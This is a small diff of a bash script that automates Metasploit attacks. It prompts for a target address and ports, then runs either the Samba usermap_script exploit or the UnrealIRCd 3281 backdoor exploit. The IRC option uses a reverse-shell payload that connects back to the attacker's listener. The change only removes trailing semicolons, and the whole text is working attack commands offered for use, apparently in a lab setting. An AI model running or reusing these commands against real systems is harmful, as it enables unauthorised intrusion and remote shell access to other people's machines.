@@ -16,8 +16,8 @@ read rport
 echo "Would you like to the Samba or IRC Exploit?... Enter 1 for Samba or 2 for IRC: "
 read VAR
 	if [[ $VAR = 1 ]]; then
-      		msfconsole -q -x "use exploit/multi/samba/usermap_script; set rhost $ip; set lport $lport; exploit";
+      		msfconsole -q -x "use exploit/multi/samba/usermap_script; set rhost $ip; set lport $lport; exploit"
 	fi
 	if [[ $VAR = 2 ]]; then
-      		msfconsole -q -x "use exploit/unix/irc/unreal_ircd_3281_backdoor; set payload cmd/unix/reverse; set rhost $ip; set lhost $lhost; set lport $lport; exploit";
+      		msfconsole -q -x "use exploit/unix/irc/unreal_ircd_3281_backdoor; set payload cmd/unix/reverse; set rhost $ip; set lhost $lhost; set lport $lport; exploit"
 	fi
